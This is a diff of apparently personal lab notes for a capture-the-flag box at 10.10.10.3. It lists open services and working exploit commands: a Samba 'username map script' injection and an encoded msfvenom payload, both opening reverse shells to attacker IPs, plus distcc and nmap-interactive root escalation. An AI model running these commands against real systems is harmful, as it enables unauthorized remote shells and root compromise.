@@ -1,13 +1,10 @@
 
 21/tcp  open  ftp         vsftpd 2.3.4
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-
- Searchsploit
- vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)    
-
+	Searchsploit
+ 	vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)    
 
 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-
 
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 
@@ -18,49 +15,50 @@
         ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
 
 
- Searchsploit - Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+		Searchsploit - Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
 
-//Manual exploit
-
-
- username = "/=`nohup " + payload.encoded + "`"
-
- sudo smbclient //10.10.10.3/tmp -U '"./"=`nohup "nc -e /bin/bash 10.10.14.2 8080"`' 
-
- or
-
- sudo smbclient //10.10.10.3/tmp
-
- smb:> logon "/=`nohup nc -e /bin/bash 10.10.14.2 8080 `" 
+	//Manual exploit
 
 
+ 	username = "/=`nohup " + payload.encoded + "`"
+
+ 	sudo smbclient //10.10.10.3/tmp -U '"./"=`nohup "nc -e /bin/bash 10.10.14.2 8080"`' 
+
+ 	or
+
+ 	sudo smbclient //10.10.10.3/tmp
+
+ 	smb:> logon "/=`nohup nc -e /bin/bash 10.10.14.2 8080 `" 
 
 
-//Via Smbattack.py script
+		Root
 
-msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.0 LPORT=1234 -f python
+	//Via Smbattack.py script
+
+	msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.0 LPORT=1234 -f python
 
 
-buf =  b""
-buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6f"
-buf += b"\x77\x78\x70\x63\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31"
-buf += b"\x30\x2e\x31\x34\x2e\x31\x30\x20\x39\x39\x39\x39\x20"
-buf += b"\x30\x3c\x2f\x74\x6d\x70\x2f\x6f\x77\x78\x70\x63\x20"
-buf += b"\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74"
-buf += b"\x6d\x70\x2f\x6f\x77\x78\x70\x63\x20\x32\x3e\x26\x31"
-buf += b"\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6f\x77\x78"
-buf += b"\x70\x63"
+	buf =  b""
+	buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6f"
+	buf += b"\x77\x78\x70\x63\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31"
+	buf += b"\x30\x2e\x31\x34\x2e\x31\x30\x20\x39\x39\x39\x39\x20"
+	buf += b"\x30\x3c\x2f\x74\x6d\x70\x2f\x6f\x77\x78\x70\x63\x20"
+	buf += b"\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74"
+	buf += b"\x6d\x70\x2f\x6f\x77\x78\x70\x63\x20\x32\x3e\x26\x31"
+	buf += b"\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6f\x77\x78"
+	buf += b"\x70\x63"
 
-{"mode":"full","isActive":false}
-
+	{"mode":"full","isActive":false}
 
 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
-
 
 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
 	/usr/share/nmap/scripts/distcc-cve2004-2687.nse
 	distcc-exec
 	sudo nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="cmd='hostname'"
-		syntax is incorrect, amended as above
-
-
+		//syntax is incorrect, amended as above
+			nmap --interactive
+			!sh
+				root
+				
+			
